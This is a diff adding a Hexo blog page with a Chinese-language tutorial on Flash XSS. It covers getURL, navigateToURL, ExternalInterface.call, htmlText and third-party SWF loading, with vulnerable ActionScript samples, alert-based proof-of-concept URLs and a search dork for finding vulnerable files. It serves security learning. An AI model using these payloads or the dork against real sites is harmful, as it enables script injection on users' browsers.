@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Owasp top 10," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Flash中编程使用的是ActionScript脚本, Flash产生的xss问题主要有两种方式：加载第三方资源和与javascript通信引发XSS。 更多flash xss学习链接：1https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/ 1http://wps2015.org/drops/drops/%E5%B8%">
+<meta name="keywords" content="Owasp top 10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Flash Xss">
+<meta property="og:url" content="http://eagerseven.cn/2017/09/26/Flash_Xss/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="Flash中编程使用的是ActionScript脚本, Flash产生的xss问题主要有两种方式：加载第三方资源和与javascript通信引发XSS。 更多flash xss学习链接：1https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/ 1http://wps2015.org/drops/drops/%E5%B8%">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-10-31T11:54:03.510Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Flash Xss">
+<meta name="twitter:description" content="Flash中编程使用的是ActionScript脚本, Flash产生的xss问题主要有两种方式：加载第三方资源和与javascript通信引发XSS。 更多flash xss学习链接：1https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/ 1http://wps2015.org/drops/drops/%E5%B8%">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2017/09/26/Flash_Xss/"/>
+
+
+
+
+
+  <title>Flash Xss | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2017/09/26/Flash_Xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Flash Xss</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-26T21:42:00+08:00">
+                2017-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2,017
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Flash中编程使用的是ActionScript脚本, Flash产生的xss问题主要有两种方式：加载第三方资源和与javascript通信引发XSS。</p>
+<p>更多flash xss学习链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wps2015.org/drops/drops/%E5%B8%B8%E8%A7%81Flash%20XSS%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F.html</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://wizardforcel.gitbooks.io/xss-naxienian/content/13.html</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.freebuf.com/sectool/108568.html</span><br></pre></td></tr></table></figure>
+<h3 id="flash安全沙盒"><a href="#flash安全沙盒" class="headerlink" title="flash安全沙盒"></a>flash安全沙盒</h3><p>Flash 安全沙盒用于控制swf文件间跨域访问,如果两个域之间没有进行信任授权是无法进行数据交互的.尝试访问会产生安全错误。两个不同安全域下的swf文件，之间是不能互相交互数据的。如果想让两个处于不同安全域内的SWF文件进行数据交互通信，必须要经过授权来实现。经过数据通信授权后即可进行数据通信交互。</p>
+<h5 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h5><p>ActionScript中关于SWF文件跨域信任授权访问是通过Security.allowDomain()方法来实现的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a.example.com/a.swf</span><br></pre></td></tr></table></figure></p>
+<p>代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var loader:Loader =new Loader();</span><br><span class="line"></span><br><span class="line">loader.contentLoaderInfo.addEventListener(Event.INIT,init);</span><br><span class="line"></span><br><span class="line">var url:String=”http://b.example.com/b.swf&amp;#8221;;</span><br><span class="line"></span><br><span class="line">loader.load(new URLRequest(url));</span><br><span class="line"></span><br><span class="line">function init(event:Event):void</span><br><span class="line"></span><br><span class="line">&#123; trace(loader.content);&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b.example.com/b.swf</span><br></pre></td></tr></table></figure>
+<p>代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Security.allowDomain(“a.example.com”);</span><br><span class="line"></span><br><span class="line">Security.allowDomain(“*”);</span><br></pre></td></tr></table></figure></p>
+<p>上面是两种不同的设置方式</p>
+<p>1.只允许a.example.com访问b.example.com中的SWF文件</p>
+<p>2.如果使用*号那么任何域中的SWF文件都能访问执行调用b.exaple.com中的SWF文件。</p>
+<p>1.Crossdomian.xml</p>
+<p>Crossdomian.xml是控制Flash的跨域策略文件,放在网站根目录.作用和allowDomain类似，在Crossdomain.xml文件中可以设置一个或多个信任域名.下面是youku的Corssdomian.xml文件。</p>
+<cross-domain-policy>
+
+<allow-access-from domain="”*.youku.com”/">
+
+<p><allow-access-from domain="”*.ykimg.com”/">//允许ykimgcom域名的Flash访问</allow-access-from></p>
+<allow-access-from domain="”*.tudou.com”/">
+
+<allow-access-from domain="”*.tudouui.com”/">
+
+<allow-access-from domain="”*.tdimg.com”/">
+
+<p></p></allow-access-from></allow-access-from></allow-access-from></allow-access-from></cross-domain-policy><br>2.Flash getURL XSS<p></p>
+<p>在Flash中Actionscript2 可以使用getURL来执行JavaScript 下面以一个实例来剖析下Flash XSS过程：使用“Adobe Flash”创建Flash文件,F9快捷键调出代码编辑器,Ctrl+回车运行swf文件。用创建完成的Falsh文件。先看下面本地的简单测试实例</p>
+<h5 id="FLASH代码"><a href="#FLASH代码" class="headerlink" title="FLASH代码:"></a>FLASH代码:</h5><p>代码大致意思加载外部含有xss代码的XML<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var Fei_xml:XML = new XML(); //创建xml对象</span><br><span class="line"></span><br><span class="line">Fei_xml.ignoreWhite = true; //</span><br><span class="line"></span><br><span class="line">Fei_xml.onLoad = function()&#123;</span><br><span class="line"></span><br><span class="line">getURL(Fei_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue)&#125; //获取值</span><br><span class="line"></span><br><span class="line">Fei_xml.load(_root.xss); //加载XML文档</span><br></pre></td></tr></table></figure></p>
+<p>XML代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(‘Flash Xss Test’)</span><br></pre></td></tr></table></figure></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/yins/xss/9.swf?xss=falsh.xml xss</span><br></pre></td></tr></table></figure></p>
+<p>代码触发</p>
+<h5 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h5><p>造成Flash XSS 的主要原因就是没对?XSS=flash.xml获取的内容进行过滤导致的.提供一个查找此类漏洞文件的google关键字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Goole hack: filetype:swf inurl:xml</span><br></pre></td></tr></table></figure></p>
+<p>3.Flash navigateToURL XSS</p>
+<p>在Actionscript3中已经不在支持getURL,可以用navigateToURL来执行javascript 下面以一个实例来剖析下Flash navigateToURL XSS过程.</p>
+<h5 id="FLASH代码-1"><a href="#FLASH代码-1" class="headerlink" title="FLASH代码:"></a>FLASH代码:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">var url:String = stage.loaderInfo.parameters.url //获取url参数值</span><br><span class="line"></span><br><span class="line">var req:URLRequest = new URLRequest(“falsh.xml”);</span><br><span class="line"></span><br><span class="line">var ld:URLLoader = new URLLoader();</span><br><span class="line"></span><br><span class="line">ld.addEventListener(Event.COMPLETE ,ok);</span><br><span class="line"></span><br><span class="line">var url:String = stage.loaderInfo.parameters.url //获取url参数值</span><br><span class="line"></span><br><span class="line">var req:URLRequest = new URLRequest(“falsh.xml”);</span><br><span class="line"></span><br><span class="line">var ld:URLLoader = new URLLoader();</span><br><span class="line"></span><br><span class="line">ld.addEventListener(Event.COMPLETE ,ok);</span><br><span class="line"></span><br><span class="line">function ok(evtObj:Event):void &#123;</span><br><span class="line"></span><br><span class="line">if(ld.data)&#123;</span><br><span class="line"></span><br><span class="line">//navigateToURL(new URLRequest(“javascript:alert(“+url+”)”),’_self’)</span><br><span class="line"></span><br><span class="line">navigateToURL(new URLRequest(url),’_self’) //通过navigateToURL调用执行</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ld.load(req)</span><br></pre></td></tr></table></figure>
+<p>代码大意使用stage.loaderInfo.parameters.url 获取外部参数值，使用navigateToURL执行参数值。</p>
+<h5 id="访问"><a href="#访问" class="headerlink" title="访问:"></a>访问:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/yins/xss/flash.swf?url=javascript:alert(%27navigateToURL%20Flash%20XSS%20TEST%27)</span><br></pre></td></tr></table></figure>
+<p>XSS代码触发</p>
+<h5 id="Flash-ExternalInterface-call-XSS"><a href="#Flash-ExternalInterface-call-XSS" class="headerlink" title="Flash ExternalInterface.call XSS"></a>Flash ExternalInterface.call XSS</h5><p>Flash中同样可以使用ExternalInterface.call执行javascript 代码，ExternalInterface.call可传递零个参数或传递多个参数我们只探讨如下两个。</p>
+<p>ExternalInterface.call(“函数名”):<br>ExternalInterface.call(“函数名”,”参数”)。<br>先说参数1缺陷时利用，参数1 也就是函数名.在参数1可控的时候即可造成XSS。先看下面Flash代码</p>
+<h5 id="FLASH代码-2"><a href="#FLASH代码-2" class="headerlink" title="FLASH代码:"></a>FLASH代码:</h5><p>代码大意接收url提交的Feigege参数,然后 ExternalInterface.call把Feigege参数值放到ExternalInterface.call执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var xss:String = root.loaderInfo.parameters.Feigege</span><br><span class="line"></span><br><span class="line">if(ExternalInterface.available)&#123; // 属性报告当前容器是否为支持 ExternalInterface</span><br><span class="line"></span><br><span class="line">ExternalInterface.call(xss) //执行js代码</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">trace(100)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop()</span><br></pre></td></tr></table></figure></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/yins/xss/flash.swf?Feigege=alert(‘Flash xss TEst’)</span><br></pre></td></tr></table></figure></p>
+<p>XSS代码触发</p>
+<p>下面说参数2可控时的利用方式</p>
+<h5 id="FLASH代码-3"><a href="#FLASH代码-3" class="headerlink" title="FLASH代码:"></a>FLASH代码:</h5><p>代码大意接收url提交的xss参数,然后 ExternalInterface.call把xss参数值放到ExternalInterface.call第二个参数执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var key:String = root.loaderInfo.parameters.xss</span><br><span class="line"></span><br><span class="line">if(ExternalInterface.available)&#123;</span><br><span class="line"></span><br><span class="line">ExternalInterface.call(“alert”,key)//执行js</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">trace(100)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop()</span><br></pre></td></tr></table></figure></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/yins/xss/flash.swf?xss=%27xss%27</span><br></pre></td></tr></table></figure></p>
+<h5 id="Flash-HTMLText-XSS"><a href="#Flash-HTMLText-XSS" class="headerlink" title="Flash HTMLText XSS"></a>Flash HTMLText XSS</h5><p>在Flash里支持HTMLText属性，HTMLText的作用是显示html标签等。可以使用 img 或者a标签触发xss代码。先看用a标签的情况下。</p>
+<h5 id="FLASH代码-4"><a href="#FLASH代码-4" class="headerlink" title="FLASH代码"></a>FLASH代码</h5><p>代码大意 获取Feigege参数值，放到TextField里面显示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var a:String = root.loaderInfo.parameters.Feigege //获取提交参数的值</span><br><span class="line"></span><br><span class="line">var info:TextField = new TextField(); //创建控件对象</span><br><span class="line"></span><br><span class="line">info.multiline=true;</span><br><span class="line"></span><br><span class="line">info.wordWrap=true;</span><br><span class="line"></span><br><span class="line">info.htmlText = a; //显示</span><br><span class="line"></span><br><span class="line">addChild(info); &gt;</span><br></pre></td></tr></table></figure></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/yins/xss/text.swf?Feigege=%3Ca%20href=%27javascript:alert(%22xss%20test%22)%27%3EXSS%20click%3C/a%3E</span><br></pre></td></tr></table></figure></p>
+<p>点击输出的XSS CLICK</p>
+<p>这种方法相对比较被动还需要点击触发。接着看下面的利用方式。使用<img>标签加载一个远程含有js跨站代码的swf文件.</p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/yins/xss/text.swf?Feigege=&lt;img%20src=%27http://127.0.0.1/yins/xss/1.swf%27&amp;gt;</span><br></pre></td></tr></table></figure></p>
+<p>加载1.swf执行跨站代码</p>
+<p>SWF代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExternalInterface.call(“alert(‘xss test’)”);</span><br></pre></td></tr></table></figure></p>
+<h5 id="flash-XSF加载第三方文件函数"><a href="#flash-XSF加载第三方文件函数" class="headerlink" title="flash XSF加载第三方文件函数"></a>flash XSF加载第三方文件函数</h5><p>flash air中读取本地文件的三种方法</p>
+<h5 id="什么是XSF"><a href="#什么是XSF" class="headerlink" title="什么是XSF?"></a>什么是XSF?</h5><p>就是使用ActionScript加载第三方的Flash文件时，攻击者能控制这个第三方的Flash文件这样就有可能造成XSF攻击，以下函数如果使用不当就很容易产生XSF问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">loadVariables()</span><br><span class="line"></span><br><span class="line">loadMovie()</span><br><span class="line"></span><br><span class="line">loadMovieNum()</span><br><span class="line"></span><br><span class="line">FScrollPane.loadScrollContent()</span><br><span class="line"></span><br><span class="line">LoadVars.send</span><br><span class="line"></span><br><span class="line">XML.load(‘URL’)</span><br><span class="line"></span><br><span class="line">LoadVars.load(‘url’)</span><br><span class="line"></span><br><span class="line">Sound.loadSound(‘url’)</span><br><span class="line"></span><br><span class="line">NetStream.play(‘url’)</span><br></pre></td></tr></table></figure></p>
+<p>在ActionScript2中可以使用loadMovie函数来加载第三方文件,在ActionScript3中,已经去掉这个函数，改由loader来进行外部数据处理，在HTML中嵌入flash时候IE下和非IE下也有所不同，IE下使用embed 非IE下使用object看下面例子。</p>
+<p>HTML代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">data=”http://192.168.1.126/yins/xss/3.swf”&amp;gt;</span><br><span class="line"></span><br><span class="line">name=”Flashvars” value=”swf=http://up.51xxs.com/users/public/1456213213_546475.swf”</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在html中嵌入flash 时比较重要的两个参数allowScriptAccess和allowNetworking作用非别如下</p>
+<p>  allowScriptAccess：控制html页面与Flash页面的通讯。</p>
+<p>  always：html和Flash页面的通讯不做任何的限制；</p>
+<p>  samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】；</p>
+<p>  never：html和Flash禁止通讯。</p>
+<p>  allowNetworking：控制Flash与外部的网络通讯。</p>
+<p>  all：Flash所有的网络API通讯接口都可用；</p>
+<p>  internal：navigateToURL，fscommand，ExternalInterface.call不可用；</p>
+<p>  none：所有的网络API不可用。<br>      SWF代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var param:Object = root.loaderInfo.parameters;</span><br><span class="line"></span><br><span class="line">var swf:String = param[“swf”];</span><br><span class="line"></span><br><span class="line">var myLoader:Loader = new Loader();</span><br><span class="line"></span><br><span class="line">var url:URLRequest = new URLRequest(swf);</span><br><span class="line"></span><br><span class="line">myLoader.load(url);</span><br><span class="line"></span><br><span class="line">addChild(myLoader);</span><br></pre></td></tr></table></figure></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.126/yins/xss/1.html</span><br></pre></td></tr></table></figure></p>
+<p>会加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://up.51xxs.com/users/public/1456213213_546475.swf</span><br></pre></td></tr></table></figure></p>
+<p>这个恶意swf文件导致XSF。</p>
+<h5 id="未初始化变量导致的XSS"><a href="#未初始化变量导致的XSS" class="headerlink" title="未初始化变量导致的XSS"></a>未初始化变量导致的XSS</h5><p>在php 中Globals 也就是全局变量在开启的时候，允许在POST个GET参数中改变php脚本中变量的值。在ActionScript2中也有类似的特性，任何未被初始化的变量都可以以POST或GET方式来改变变量的值，因此会导致一些安全问题.看下面测试</p>
+<p>VER.SWF代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(user)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">getURL(_root.Feigege);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.126/yins/xss/ver.swf?user=true&amp;Feigege=javascript:alert(/xss%20test/);</span><br></pre></td></tr></table></figure></p>
+<p>由于user未进行初始化变量赋值，导致可以通过GET方式为user赋值绕过，然后使用getURL来执行javascript代码</p>
+<p>————-爬自安全脉搏</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
